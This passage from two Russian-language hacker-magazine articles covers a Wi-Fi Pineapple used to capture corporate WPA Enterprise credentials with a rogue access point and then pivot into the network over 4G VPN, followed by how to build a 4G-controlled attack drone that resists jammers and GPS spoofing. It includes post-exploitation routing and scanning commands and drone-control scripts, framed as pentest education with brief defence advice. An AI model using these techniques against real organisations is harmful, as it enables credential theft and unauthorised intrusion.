    elif echo "$line" | fgrep -q 'AP-STA-DISCONNECTED'; then
        led green off 2> /dev/null
    elif echo "$line" | fgrep -q 'STA'; then
        led yellow on 2> /dev/null
    elif echo "$line" | fgrep -q 'username:'; then
        led red on 2> /dev/null
    fi
done

Для привлечения кли ентов может быть запущен скрипт deauth.sh, отклю-
чающий клиенты от их легитимных точек дос тупа.
  Нужно обратить осо бое внимание, что при имитации легитимной точки
доступа WPA Enterprise можно получить пароль в открытом виде! Это зависит
от того, как легитим ная беспровод ная сеть запомнилась на клиентском
устройстве. Если это GTC, то пароль можно получить откры тым тек стом, если
MSCHAP — в виде хеша NetNTLMv1, пароль из которо го можно восста новить
за конечное вре мя. А в качес тве самих учет ных записей в WPA Enterprise,
как правило, используют ся доменные логин и пароль. Это зна чит, что, зах-
ватив такую учетку, злоумыш ленник либо  тут же под ключается по Wi-Fi
и попадает сразу во внутреннюю сеть компании, при чем уже с доменной учет-
ной записью, либо заходит в нее уда лен но, например по VPN, при его
наличии.
   Это может показаться весьма странным, ведь при атаках на сети WPA PSK,
которые есть практически в каж дом доме, злоумышленник довольствовал-
ся бы лишь handshake, который надо еще брутить и бру тить, порою весьма
долго. А при ата ках на WPA Enterprise он получает либо NetNTLMv1-хеш,
который на порядки сла бее того же PSK и за уме ренное вре мя может быть
све ден до LM-хеша, либо пароль откры тым текстом! Хотя WPA Enterprise счи-
тается стан дартом для предприятий и, по идее, дол жен быть дос таточно
защищенным.
   Эта уяз вимость справед лива только для сетей WPA EAP (Enterprise), встре-
чающихся в кор поративном сегменте, что делает ее весьма опасной, ведь
она может стать точкой проникновения в ком панию со все ми вытекающими
пос ледствиями.
   Pineapple, заряженный такой атакой, может быть помещен как в зоне дей-
ствия легитимных точек доступа, так и за их пре делами на достаточно дли-
тель ный срок, как про демонстри ровано на сле дующем рисунке. Клиенты,
которые и будут мишеня ми для ата ки, подвижны и обычно в начале или конце
рабочего дня часто выходят из зоны пок рытия, где их может поджидать
Pineapple.





   Pineapple воз ле офиса компании ловит корпоративные учетные данные

Как правило, у каждой компании, откры той или режимной, всегда есть место,
через которое помещение покидают все сотрудни ки, — главный вход.
Это неболь шая область, где за короткое время могут проходить сот ни
или тысячи людей и где уже нет при ема корпоратив ной беспро водной сети.
Именно эта область может быть зоной дей ствия Pineapple. И сотрудни ки,
еще не успевшие отклю чить Wi-Fi на устрой ствах, сами того не подозревая,
авто мати чески ском промети руют свои учет ные записи и тем самым откроют
две ри во внутреннюю сеть компании. Зло умышленник, получивший туда дос-
туп с доменной учетной записью, с большой долей вероятности сможет ском-
про метировать всю внут реннюю инфраструктуру, причем дос таточно быс тро.


Ïîñòýêñïëóàòàöèÿ
Ес ли подбор пароля или иная атака завершились успешно, злоумышленник
вновь может использовать Pineapple уже для уда ленного доступа к целевой
Wi-Fi-сети через VPN, прокинутый по 4G. Pineapple берет на себя задачу
физического лин ка с сетью и логичес кой мар шрутиза ции пакетов туда:


wpa_passphrase 'target_essid' 'password' > wifi.conf
wpa_supplicant -i wlan0 -c wifi.conf & dhclient wlan0
sysctl -w net.ipv4.ip_forward= 1
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE

Удаленный  ата кующий, имеющий  VPN-соединение  с  Pineapple,  может
получить сетевой дос туп к интересующей его Wi-Fi-сети, просто указав
Pineapple в качестве сетевого шлю за:


route add -net 192.168.1.0/24 gw pineapple
nmap 192.168.1.0/24

Те перь ему остается толь ко положить Pineapple вблизи скомпро метирован-
ного беспроводного устрой ства и вернуть ся в ком фор тное помеще ние.





  Pineapple в качестве 4G-шлю за к ском прометированному беспро вод-
  ному устрой ству

Нап ример, беспроводные принтеры, которых всегда пре достаточно почти
у любой организации, час то имеют не самые надежные пароли. Второй
«ногой» такие принтеры, как пра вило, стоят уже в локаль ной сети.
   Pineapple по VPN пре дос тавит злоумыш леннику удаленный сетевой доступ
в ском промети рованную беспровод ную сеть, где могут быть развиты уже
пос ледующие длительные ата ки. И на этом учас тие Pineapple заканчивается.
Дальше уже начинается фаза внутреннего проникновения. Но это уже совсем
другая история…


ÊÀÊ ÇÀÙÈÒÈÒÜÑß

Возможность совершить так много атак с исполь зовани ем одного мини атюр-
ного устройства заставляет задуматься о кардинальных мерах защиты, устра-
няющих «на корню» все перечисленные атаки.
   Устройство Pineapple хорошо демонстри рует главным образом незамет-
ность атак. Ведь все описанные атаки уже давно можно про водить с обыч-
ного ноутбука. Но мало кто ста нет этим занимать ся, сидя в сугробе возле
окна под присмотром камеры.
   Главное, что мож но рекомендовать безопасникам, — это реализовать
тщательный контроль за беспроводными сетями. В идеале их зона покрытия
не дол жна выходить за пределы контро лируемой зоны. Даже если бес про-
вод ные сети уязвимы, нужно сделать эти уяз вимос ти исключительно внут-
ренними, не давать их про эксплу ати ровать за пре делами офиса. В таком слу-
чае у потенциального злоумыш ленника не будет даже физичес кой воз-
можнос ти начать атаки, и это пресечет все угрозы. © X
COVERSTORY





        СТРОИМ ХАКЕРСКИЙ
           БЕСПИЛОТНИК:
         ДАЛЬНОБОЙНЫЙ
     И С ЗАЩИТОЙ ОТ ГЛУШИЛОК




Ты сидишь за кла виатурой на одном из вер-
хних  этажей  охраняемо го  зда ния,  рас-
положенного  пос реди   закрытой   тер-
ритории в окру жении забора с колючей
про волокой под напряжени ем. Ты чувству-               s0i37                                                                                   Lead cybersecurity analyst at
ешь себя в полной безопасности — за ней      USSC t.me/s0i37_channels0i37@ya.ru
следят не толь ко камеры, но и бдитель ная
охрана. За окном раздается подозритель-
ное    жуж жание,    ты    отвле каешься
на непонятный источник звука, и этих нес-
кольких секунд достаточно, что бы на твой
компь ютер установился бэкдор, а хакер,
расположенный в 20 км от тебя, про ник
в корпоративную сеть. Фан тастика? Ничего
подобного!


Дрон — отличный инструмент для зло умышленни ка, пос кольку такой аппарат
может нести на себе до трети собственной массы в виде полез ной нагрузки.
Но атаковать удаленный объект «по воз духу» не так-то прос то: «хакерский
дрон» дол жен обладать высокой автономностью, управляться по защищен-
ному каналу на расстоянии в десятки километров, а еще уметь про тивостоять
средствам подавления и «глушилкам». Сегод ня мы подробно расскажем,
как устроены такие дроны и как их можно соб рать из подручных средств,
модифи цировав обычный бюджетный квадрокоп тер. И разуме ется, о том,
как эффектив но противостоять таким хитрым девайсам.
  В предыдущей статье я описал ата ки, требующие непосредс твенного при-
сутствия злоумышленника поблизости от атакуемого объекта. Но ограничен-
ный радиус беспроводных сетей не поз воля ет «дотянуть ся» абсо лютно
до всех целей. Однако устрой ство столь малого размера можно не только
незамет но спрятать под окнами, его можно помес тить внутрь небольшой
посылки и нап равить кому угодно. И тогда, двигаясь по коридорам зданий,
оно будет спо собно совершить уже совсем иные атаки. Правда, посылка —
это для устройства Pineapple билет в один конец. Беспроводные атаки мож но
про водить и с помощью дрона.




                      Эта статья — часть серии пуб ликаций о прак-
                        тичес ких при емах взлома и атак с использовани-
                    ем под ручных устройств, которые мож но собрать
                       дома. В этих материалах мы рас крываем прос тые
                       спо собы получения несанкционированного дос-
                         тупа к защищенной информации и показываем,
                         как ее оградить от подобных атак. Предыду щая
                         статья серии: «Грозный ананас. Собираем и при-
                     меняем свой Wi-Fi Pineapple».




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


Дроны ста ли незаме нимы в самых разных областях, и сегодня они дос тупны
прак тически каж дому. Но что они могут дать хакеру?
  Важ ная особенность дрона зак люча ется в том, что к нему можно при-
соединить фак тически что угодно. Таким обра зом дрон может зна чительно
уве личить дистанцию при менения атак, ведь он поз воляет быстро получить
физический дос туп туда, куда нельзя добрать ся ногами. Дрон может преодо-
леть поч ти любое ограждение, под лететь к окнам высотного здания и, что
немаловажно, сделать это дос таточно быстро, а иногда и незаметно. Мини-
атюрные габари ты позволяют ему пролететь даже в при открытое окно, про-
никнуть в помеще ние и молниеносно совершить компьютерные атаки. Одним
словом, с таким средством доступной становится практичес ки любая цель.
   Это делает дрон край не удобным для про веде ния быстрых атак, реали-
зуемых через беспровод ные технологии — то есть там, где тре буется фик-
сированный и часто небольшой радиус действия. Так что атаки, показанные
в некоторых компьютерных играх, вполне реальны.





         Кол лекционная ста туэтка PureArts по игре Watch Dogs 2


ÐÅÀËÈÇÀÖÈß

Дроны в боль шинс тве слу чаев управляются по ради оканалу. При этом час-
тоты и про токолы для при ема сиг нала с пульта (RX), а также для передачи
видео и телеметрии с дрона (TX) могут отличать ся. В обобщенном виде
это выг лядит так:
 • RX по выделенным радиоканалам FRSKY, ELRS или TBS, TX аналого вый,
  реже цифровой выделенный канал (про фессиональные дроны);
 • RX по выделен ным радиоканалам, TX по Wi-Fi (самый рас пространенный
   вариант);
 • RX и TX по Wi-Fi (ком натные дроны).

Для атакующе го дрон глав ным обра зом транспортное средство, поэтому он
должен быть креп ким и надежным. Поскольку почти все атаки так или иначе
могут быть связаны с близким пролетом вблизи строений, а где-то даже
и внут ри них, то куда важнее обеспечить максималь ную защиту пропеллеров,
нежели высокую скорость. Отличным выбором могут быть дроны с защитной
рамой вок руг пропеллеров (Cinewhoop), как на следующем рисунке.





                 Модель рамы Cinewhoop

Такая конструк ция не позволяет дрону раз бить ся в случае контакта со стеной
или другими пре пятствиями. Дрон также должен иметь некоторый запас мощ-
ности, дос таточный для подъема хакерских девайсов массой хотя бы с треть
его собственной.
  Поскольку зло умышленник может ата ковать отда ленные объ екты, исполь-
зовать для этого целесообразно дроны, управление которых завязано не на
Wi-Fi. Ведь ради ус Wi-Fi ограничен 50–100 м, и управляемость (отклик) ухуд-
шается по мере отдаления дрона от пульта управле ния. Профес сиональные
дроны с выделенным ради ока налом управления (FRSKY, ELRS или TBS) под-
ходят для подобных целей куда лучше. По прямой видимос ти дрон на таком
управле нии может улететь на нес колько километров, и время отклика
при этом дер жится на при емлемом уровне.
   Раз летать зло умышленни ку придется не в чистом поле, а вблизи зданий,
где находятся объекты атак, то немало важен и контроль над полетом. Дроны
семей ства FPV обес печивают максимально воз можное погружение и вид
от первого лица.
  Отличным выбором по гибкости, открытости ком понентов и простоте ста-
нут  популярные  дроны  с  полетным  кон трол лером  системы  Betaight.
Основные плю сы подоб ных открытых решений:
 • возможность модифи кации — всегда можно добавить или убрать тот
   или иной ком понент (дат чик высоты, GPS и прочее);
 • от крытость — дрон всег да доступен для различных модификаций и нес-
   тандар тных решений;
 • мо дульность — если дрон разобьется, то приобрести нужно будет только
   раму; полетный контрол лер, при емник, пульт и очки остаются невредимы-
   ми.

На самом деле не так важна модель дрона, куда важ нее умение хорошо
летать. Прежде чем перехо дить к ата кам с дрона, стоит немного поговорить,
как возможно улуч шить управле ние дро ном и защитить его.


Óïðàâëåíèå ÷åðåç 4G
По леты сре ди зданий могут сильно уменьшить предельную дистанцию. Даже
если у дрона супер дальнобой ная система связи, она не пробьет нес колько
бетонных стен, когда квадрокоп тер залетит за здание.
  Но что, если дрон будет управлять ся по мобильным сетям? В наше время
хороший при ем обеспечивается даже за предела ми города, не говоря уже
про здания. Сотовую связь можно использовать в качестве отличного канала
для передачи данных. Тогда рас стояние полета будет огра ниче но исклю-
чительно ресурсом акку мулятора.
  Сегодня 4G-сети обладают дос таточно высокой ско ростью, но при их
использовании отклик от пуль та управления и картинка с камеры не переда-
ются с той же ско ростью, как на спе циально раз работанных для этого ради-
опротоколах. Тем не менее полет впол не возможен. А с учетом скорости,
с которой дро ны способ ны лететь (200 км/ч), и запаса акку мулятора зло-
умыш ленник может атаковать цель на рас стоянии более 20 км!
   Итак, как перевес ти дрон на 4G-управление? Это должно быть не очень
сложное решение, при менимое к широкой линей ке доступных моделей. Мож-
но использовать, например, следующую схему.


4G → Wi-Fi-øëþç → äðîí
Са мые простые и дешевые дроны полностью управля ются по Wi-Fi. Внутри
дрона запущена точка дос тупа Wi-Fi, мобильный телефон под ключается к ней
и через приложе ние отправляет коман ды в обычный UDP-порт. Видео с дро-
на идет в обратном направлении на телефон простым RTSP-стримом.
Получается, дрон — это обычное сетевое устрой ство. Следовательно, если
к нему прикрепить мини-компь ютер с 4G-модемом, то через VPN можно
проброситься прямо в дрон с любого расстояния. И далее останется лишь
отправ лять закодированные команды управления моторами.
  Однако в этом спо собе есть пара минусов. Во-первых, скорее все го, при-
дет ся   иметь  дело   с   закрытым  протоколом  и  ревер сить   его
с успешностью 50/50 — повезет или нет. Возможно, попадется шифрование,
а воз можно — аутентифика ция с неизвес тным принципом. Сло вом, взла-
мывать собственный дрон, чтобы полетать, нес коль ко странно. Во-вторых,
в такие про токолы зак ладывают дос таточ но частую отправку пакетов от пульта
на дрон. Это сделано для лучшего отклика при управле нии. Кроме того, если
сиг нал с пульта теряется, дрон оперативно это понимает. Тут абсо лютно
невыгод но отправ лять по сети одни и те же пакеты на дрон, ведь так 4G-канал
управле ния будет забит, а по нему должно передаваться еще и видео.


4G → âèäåîøëþç → äðîí
А что, если вмес то сетевого шлюза для дос тупа к дрону воспользоваться
видеошлю зом? То есть к квадрокоптеру прикрепить небольшой телефон,
под клю ченный к нему по Wi-Fi, а к самому телефону под клю читься с помощью
средства уда лен ного управления? Ведь в любом случае видео с дрона нужно
смот реть, только теперь это можно будет делать с экра на уда ленного
телефона.
   Как ни странно, этот способ позволяет решить все проб лемы. Телефон
дает отвязку по трафику — все пакеты с тре буемой скоростью он отправляет
сам, пилот лишь через виртуальные сти ки на экра не уда ленного телефона
управляет дроном. Также видеопоток с экрана телефона принимается умень-
шенного качества, что еще немного уве личи вает ско рость передачи. Плюсом
мобильное приложе ние берет на себя кодиро вание положений стиков пуль-
та, так что ничего реверсить не требует ся. Пример такой реализации при-
веден на сле дующем рисунке.





            Бюд жетный ком натный дрон и мини-телефон

Прос той до невоз можности трюк, но на самом деле он позволит преодолеть
любые расстояния и прег рады. Мини-телефон, прикрепленный к дрону, всег-
да будет обеспечивать ему при емле мый уро вень сигнала Wi-Fi, который
на таком рассто янии край не сложно заг лушить подавителем. Также он дает
раз вязку по трафику — не нужно при нимать высококачественный стрим
с дро на, а вместо этого дос таточно лишь получить картинку с экра на телефо-
на в разрешении 320 × 240, передача которой более надежна при просадках
скорос ти мобильного соединения. Еще такой подход обеспечивает раз вязку
и по про токолу: боль ше не нужно вникать в под робнос ти кодирования
положений стиков троттлин га, крена, углов ата ки и рыс канья — мобильное
при ложе ние все сде лает самостоятель но.
  Подключиться к дрону по 4G мож но с любого устрой ства — хоть с ноут-
бука, хоть с телефо на. Для это го можно использовать любое програм мное
решение для облачного удаленного управле ния, например кросс-плат-
форменный AnyDesk.





    Кросс-плат форменное уда лен ное управление дро ном через телефон

Далее, исполь зуя простые средства авто мати зации GUI, можно назначить
тем или иным нажатиям на клавиату ре определен ные действия с вир туальным
пультом на экране:


drone/control.sh

#!/bin/bash


console=$(xdotool getactivewindow)
control=$(xwininfo | grep id | grep 'xwininfo:' | awk '{print $4}')
xdotool windowfocus $control
X=$(xwininfo -id $control | grep 'Absolute upper-left X:' | awk '{
print $4}')
Y=$(xwininfo -id $control | grep 'Absolute upper-left Y:' | awk '{
print $4}')
left_stick_x=$[$X+123]
left_stick_y=$[$Y+321]
right_stick_x=$[$X+456]
right_stick_y=$[$Y+321]


xdotool windowfocus $console
while read -rsn 1 key
do
  case "$key" in
    'A')
      echo 'throttle up'
      xdotool mousemove $left_stick_x $left_stick_y
      xdotool mousedown 1
      xdotool mousemove_relative -- '0' '-50'
      xdotool mouseup 1
      ;;
    'B')
      echo 'throttle down'
      xdotool mousemove $left_stick_x $left_stick_y
      xdotool mousedown 1
      xdotool mousemove_relative -- '0' '50'
      xdotool mouseup 1
      ;;
    'w')
      echo 'pitch forward'
      xdotool mousemove $right_stick_x $right_stick_y
      xdotool mousedown 1
      xdotool mousemove_relative -- '0' '-50'
      xdotool mouseup 1
      ;;
    's')
      echo 'pitch back'
      xdotool mousemove $right_stick_x $right_stick_y
      xdotool mousedown 1
      xdotool mousemove_relative -- '0' '50'
      xdotool mouseup 1
      ;;
    'a')
      echo 'roll left'
      xdotool mousemove $right_stick_x $right_stick_y
      xdotool mousedown 1
      xdotool mousemove_relative -- '-50' '0'
      xdotool mouseup 1
      ;;
    'd')
      echo 'roll right'
      xdotool mousemove $right_stick_x $right_stick_y
      xdotool mousedown 1
      xdotool mousemove_relative -- '50' '0'
      xdotool mouseup 1
      ;;
    'q')
      echo 'yaw left'
      xdotool mousemove $left_stick_x $left_stick_y
      xdotool mousedown 1
      xdotool mousemove_relative -- '-50' '0'
      xdotool mouseup 1
      ;;
    'e')
      echo 'yaw right'
      xdotool mousemove $left_stick_x $left_stick_y
      xdotool mousedown 1
      xdotool mousemove_relative -- '50' '0'
      xdotool mouseup 1
      ;;
  esac
  xdotool windowfocus $console
done

Тут в бесконечном цик ле про исхо дит ожидание нажатия тех или иных клавиш,
пос ле чего, в соот ветствии с нажати ем, курсор мыши двигает виртуальный
стик на экране удален ного телефона. Все мак сималь но прос то.
  Данные о сос тоянии дро на (телеметрия) также в распоряжении операто-
ра, пример представлен на следующем рисунке.





         Условное расположение значений телеметрии на экране

В зависимос ти от модели дрона и мобильного приложения картинка может
отли чаться. Используя те же самые средства авто мати зации GUI, а также рас-
познавание текста, можно реали зовать про изволь ную обра ботку показа ний
телеметрии:


drone/telemetry.sh
#!/bin/bash


INTERVAL= 1
control=$(xwininfo | grep id | grep 'xwininfo:' | awk '{print $4}')


while sleep $INTERVAL
do
    gm import -window $control /tmp/drone_telemetry.png


    gm convert /tmp/drone_telemetry.png -crop 240x60+740+58 /tmp/
drone_telemetry-bat.png
    bat=$(tesseract /tmp/drone_telemetry-bat.png stdout -l eng 2> /
dev/null | grep '^[0-9]' | awk '{print $1}')


    gm convert /tmp/drone_telemetry.png -crop 240x60+461+58 /tmp/
drone_telemetry-alt.png
    alt=$(tesseract /tmp/drone_telemetry-alt.png stdout -l eng 2> /
dev/null | grep '^[0-9]')


    if [ "$bat" -lt 10 ]; then
        echo 'low battery' | festival --tts --language english
    fi


    clear
    echo "$bat $alt"
done




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ




              СТРОИМ ХАКЕРСКИЙ БЕСПИЛОТНИК:
                            ДАЛЬНОБОЙНЫЙ
                   И С ЗАЩИТОЙ ОТ ГЛУШИЛОК




Здесь выполняется цикличное распознавание текста различных областей
экрана, на которых расположены те или иные показа ния. Пос ле их пре обра-
зования с изображения на экране в понят ную компьютеру фор му можно
обрабатывать их даль ше. В этом при мере скрипт исполь зует синтезатор речи
для информирования о низком заряде аккумулятора.
  С помощью этих примити вов управления и телеметрии можно полностью
авто мати зировать полет дрона.
  Подобный подход чрезвычайно прост в исполнении и сразу открывает
доступ и к управлению, и к телеметрии, но име ет лишнее звено — телефон
с Wi-Fi. Сигнал от телефона может быть слишком силь ный, что может негатив-
но сказаться на управлении. Плюс ко всему дрон в этом случае вынужден
под нимать достаточно большую лишнюю мас су (около 50 г).


4G → UART → äðîí
Но зачем уда ленно подклю чать ся к дрону через его явные интерфейсы
управле ния (по Wi-Fi)? Почему бы злоумыш ленни ку не подключиться нап-
рямую к его полетному кон троллеру? В случае с дронами по типу «готового
решения» можно стол кнуться, ско рее всего, все с той же проблемой — зак-
рытым про токолом и необходимостью его реверсить.
  Однако есть мно жество откры тых решений для управления дронами, нап-
ример про шив ки Betaight, iNav или Ardupilot. Самое прос тое из них —
Betaight среди про чего под держивает прямую отправку команд управления
моторами в полетный контроллер через уже знакомый UART. Это значит, что
управлять дроном мож но почти с любого одноплатника. Стоит лишь подклю-
чить к нему 4G-модуль и настро ить VPN. Все-таки с откры тыми решениями
работать куда приятнее.
   Итак, атакующему сначала необходим одноплат ный компьютер минималь-
ного размера и массы, а так же 4G-модем. Отличный вариант — NanoPi Neo
Air и Sim7600G, оба устройства миниатюр ны и практически идентичны
по габаритам.





   Од ноплатный компьютер и 4G-модем для удален ной связи с дроном

Взаимодей ствие с 4G-модемом идет по UART-интерфейсу, которых у NanoPi
целых три. Первый UART можно использовать для интернет-канала, а второй
уже для связи с дро ном. На следующем рисунке представлена распиновка
контактов на мини-компьютере NanoPi для управления дроном и связи по 4G.





  Распиновка кон тактов на мини-компьюте ре NanoPi для управления дро-
  ном и связи по 4G

Пос ле неболь шой пайки модуль удаленного управления по 4G может выг-
лядеть так, как продемонстрирова но на следующем рисунке.





                  Го товый модуль управления по 4G

Даже самые прос тые полет ные кон троллеры часто имеют минимум два UART-
интерфейса, один из которых, скорее всего, занят штатным при емником,
а вто рой как раз мож но использовать для уда ленного управле ния по 4G. Под-
ключение NanoPi к полетному контроллеру про исходит ана логично штат ному
при емнику — с помощью UART.





            Подключение NanoPi к полетному контрол леру

Так мож но перек лючать дрон на тот или иной режим управления без физичес-
кого вмешательства и перепайки, исклю читель но програм мным способом (о
нем чуть позже). Все, что требуется, — только прикрепить NanoPi + Sim7600G
и соеди нить соот ветствующий шлейф. В итоге дрон с 4G-управлением выг-
лядит примерно так.





     Схе ма подключения 4G-управления к дрону с открытой прошив кой

В зависи мос ти от раз меров и формы дро на плату мож но уста навливать в раз-
ных местах и даже внут ри корпуса рамы. Можно даже рас печатать соот ветс-
твующие креп ления на 3D-принтере.
  Пора перейти к программной нас трой ке. Одноплатный компьютер NanoPi
крайне удобен в настрой ке — он эмулирует кон соль пря мо по USB, когда
на него пода ется питание. Все, что требует ся для работы с ним, — это лишь
открыть консоль непос редс твенно на USB:


minicom -D /dev/ttyACM0 -b 9600

Далее все дей ствия производят ся уже внутри NanoPi. Сначала необходимо
отклю чить все лишнее:


systemctl disable wpa_supplicant.service
systemctl disable NetworkManager.service

И активировать два UART:


armbian-config
 System -> Hardware:
    Включаем UART1 и UART2, перезагружаемся

Далее нужно пос тавить необ ходимые пакеты:


apt install minicom openvpn python3-pip cvlc

Minicom не обязате лен, но он может пот ребовать ся для пус коналадки — про-
верки, правильно ли работа ет UART и на каком порте что у нас расположено.
Нап ример, так можно удостовериться, что NanoPi и Sim7600G-модем слышат
друг друга через первый UART-интерфейс:


minicom -D /dev/ttyS1 -b 115200
AT

Ес ли все ок, то для модема должна быть про писана конфигурация мобиль-
ного под клю чения:


/etc/ppp/peers/tele2
connect "/usr/sbin/chat -v -f /etc/chatscripts/gprs -T internet.
tele2.ru"
/dev/ttyS1
115200
noipdefault
usepeerdns
defaultroute
persist
noauth
nocrtscts
local
user "tele2"
password "tele2"
debug


refuse-chap
refuse-mschap
refuse-mschap-v2
refuse-eap


/etc/chatscripts/gprs
ABORT           BUSY
ABORT           VOICE
ABORT           "NO CARRIER"
ABORT           "NO DIALTONE"
ABORT           "NO DIAL TONE"
ABORT           "NO ANSWER"
ABORT           "DELAYED"
ABORT           "ERROR"
ABORT           "+CGATT: 0"
""              AT
TIMEOUT         12
OK              ATH
OK              ATE1
OK              AT+CGDCONT= 1,"IP" ,"\T" ,"",0,0
OK              ATD* 99#
TIMEOUT         22
CONNECT         ""

Те перь, что бы акти вировать 4G, выполняем следующую команду:


pon tele2

Ес ли сеть появи лась и ping идет, значит, эти две крошеч ные платы всегда
смогут вый ти на связь по 4G-интернету, где бы они ни находились. Чтобы
при вклю чении устрой ства сра зу поднималась сеть, нужно подготовить сле-
дующий файл:


/etc/network/interfaces
auto tele2
iface tele2 inet ppp
provider tele2

Мобильный интернет — это лишь физический линк. Далее тре буется логичес-
кий линк, чтобы мож но было вый ти на связь с устройством. Для этого нужно
под клю чить устрой ство к некоторому опорному серверу по VPN:


cp your_vds.ovpn /etc/openvpn/client/vds.conf
systemctl enable openvpn-client@vds

Ес ли все прош ло нормально, то теперь всегда пос ле включения устройства
к нему мож но получить доступ, соединившись с ним по VPN через выделен-
ный опор ный сервер. Настало время нем ного поговорить о том, как NanoPi
может управлять двигателями дрона.
  Современные полетные контроллеры — весьма сложные устрой ства,
которые, как правило, поддерживают мас су протоколов управления. И если
на физическом уровне для связи с полетным контроллером исполь зуется
UART, то на логичес ком проще все го реализовать управление через протокол
MSP и соответствующую Python-библиоте ку:


cd /opt/
git clone https://github.com/alduxvm/pyMultiWii
pip3 install pyserial

Протокол достаточно прос той, а сама библиотека требует лишь зна ния
номера пор та. NanoPi под ключен к полетному кон троллеру дро на с помощью
UART2, сле довательно, это ttyS2-порт. Имея порт, можно уже отправлять зна-
чения основных каналов: крена, обо ротов пропеллеров и так далее, а также
вспомогательных каналов:


~/src/control.py
#!/usr/bin/python3
from sys import path; path.append("/opt/pyMultiWii/")
from time import sleep
from threading import Thread
from pymultiwii import MultiWii


board = MultiWii("/dev/ttyS2")
roll=1500
pitch=1500
throttle=988
yaw=1500
aux1=1000
aux2=1500
aux3=1500
aux4=1500


def arm():
    global aux1
    aux1 = 2000


def disarm():
    global aux1
    aux1 = 1000


def send():
    INTERVAL = 0.01
    while True:
        board.sendCMD(16, MultiWii.SET_RAW_RC, [roll,pitch,throttle,
yaw,aux1,aux2,aux3,aux4])
        sleep(INTERVAL)


main = Thread(target=send, args=())
main.start()
do_something()
main.join()

Стоит отме тить, что, даже если дрон не летит и на его двигатели не подаются
никакие команды, на него все рав но дол жны непрерывно отправляться дан-
ные с нейтральными значениями стиков управления, при чем достаточно час-
то. Так полетный кон троллер понимает, что связь с при емни ком все еще под-
держивается.
   Чтобы полетный контрол лер знал, отку да брать команды управле ния дви-
гателями, в его нас тройках нужно указать, что NanoPi физически соединен
с его интерфей сом UART2, а прог раммно исполь зуется протокол MSP.
Для Betaight cде лать это можно с помощью прог раммы BetaightCongurator,
как показано на следующих рисунках.





  Ме няем активный UART для при емни ка (NanoPi под ключен
  к UART2 полетного контроллера, а штатный при емник — к UART1)





     В параметрах при емника ука зыва ем про токол управления MSP

Ес ли все сде лано правильно, то с любого рассто яния появится воз можность
удаленно управлять таким дроном, пока есть сигнал мобиль ных сетей и,
конечно же, пока не сел аккумулятор.
  Передавать видео можно, подсоединив DVP-камеру напрямую к плате
NanoPi. А стрим картинки с нее по сети воз можен посредством следующе го
кода:


cvlc v4l2:///dev/video0:chroma=h264:width=800:height= 600 --sout
'#transcode {vcodec=h264,acodec=mp3,samplerate=44100}:std{
access=http,mux=ffmpeg{mux=flv},dst=0.0.0.0:8080}' –vvv

Что бы удаленно видеть картинку с дрона на любом расстоянии, нужно прос то
открыть в браузе ре «http://drone:8080/», где drone — IP-адрес VPN
NanoPi.
  Приведенные выше шаги реализации управления дроном через мобиль-
ные сети — это лишь кон цепт, демонстрирующий все необ ходимые примити-
вы связей. Чтобы дрон реально полетел и не раз бился, требуется реали-
зовать еще удобный интерфейс управления.
   Это го можно добиться через подклю чение пуль та, например EdgeTX, спо-
соб ного работать как HID-устройство. А также через трансля ции положе ний
его сти ков в команды управления, которые переда ются по сети на NanoPi,
интерпре тируются там в соответствующие MSP-команды и по UART попадают
на полетный кон троллер.
  А мож но пойти более уни версальным спо собом, позволяющим управлять
полетом без специального обо рудования, прямо с клавиатуры ноутбука
или экра на телефо на. Это проще всего реализовать через небольшое
веб-при ложение, средствами JavaScript, считывая соответствующие события
кла виату ры и нажатия по виртуальным сти кам в сообщения, оперативно
передаваемые по сети через WebSockets на NanoPi.
  Для систем под управлением Ardupilot существуют даже готовые решения.


Çàùèòà îò ãëóøèëîê
Проблему помех от зданий и ограничен ного ради уса управле ния можно
решить представ ленными выше способами, превратив вышки сотовой свя зи
из главного источника помех в лучшего друга.
  Но для дронов есть еще одна опас ность, которая их может под жидать
непосредственно на самих объектах, — это подавители дронов, или глушил-
ки.
  Для большинства подоб ных устройств must-have явля ется подав ление
частот 2,4 ГГц, на которых летает большинство прос тых дронов (с управле-
нием по Wi-Fi). Сюда же попада ет часть частот и профессиональ ных дро нов.
У серьезных  глушителей дронов в час тотах подав ления учте ны каналы
управле ния всех про фессиональных протоколов (TBS, ELRS, FRSKY и про-
чих) — 800, 900, 2400 МГц.
  Однако самая распространенная мера противодействия дро нам — глу-
шение или спуфинг сигналов GPS. Подделав сиг налы со спут ников, дрону
можно внушить любое местополо жение, что может быть использовано
для контроля над его переме щением. Так как в достаточно многих протоколах
управле ния дро нами при меняется серь езное шифрование, вполне логичной
выглядит ата ка на GPS, так как она пред став ляет ся наиболее общей. Поэтому
GPS-приемник оказывается еще одним слабым местом дронов. И потен-
циальный злоумышленник, не жела ющий, чтобы его дрон был сбит такой глу-
шилкой, дол жен изба виться от GPS.
  В некоторых «готовых» моделях дронов бортовой GPS можно отключить
програм мно.  FPV-дроны  Cinewhoop  час то  используются  в  полетах
по помеще ниям, где, как известно, GPS практически не ловится. Поэто му
часто GPS-приемни ки в такие модели не ста вят. Дроны с открытыми сис-
темами управле ния, такими как Betaight, име ют модульную структуру и всег-
да позволя ют как включить, так и отключить бортовой GPS, чего нельзя ска-
зать о более бюджетных вари антах, которые прос то отказываются лететь
без него.
   Что касается глушения каналов управления, то заг лушить дрон с управле-
нием по мобильным сетям тоже не так-то просто. Ведь теперь нужно подав-
лять сразу ряд диапазонов мобильных сетей раз ных поколе ний. А вариантов
частот у 2G, 3G и 4G немало. Если заг лушить все 4G-сети (1900, 2300, 2500,
2600 МГц), модем дрона перейдет на 3G (800, 850, 900, 1900, 1800, 2100,
2600 МГц), заг лушаем и их — перей дет на 2G (900, 1800, 1900 МГц).
  Тем не менее сущес тву ют нап равленные ради опушки, отключающие мощ-
ным импульсом вообще все радио, но им, впрочем, требуется дос таточно
точное наведе ние на цель.


PINEAPPLE

Время поподробнее рассмотреть сами атаки. Для хакера дрон лишь тран-
спорт. Реально все атаки зло умышленник может проводить с помощью
некоторого мини атюр ного устройства, прик репленного  к такому дрону.
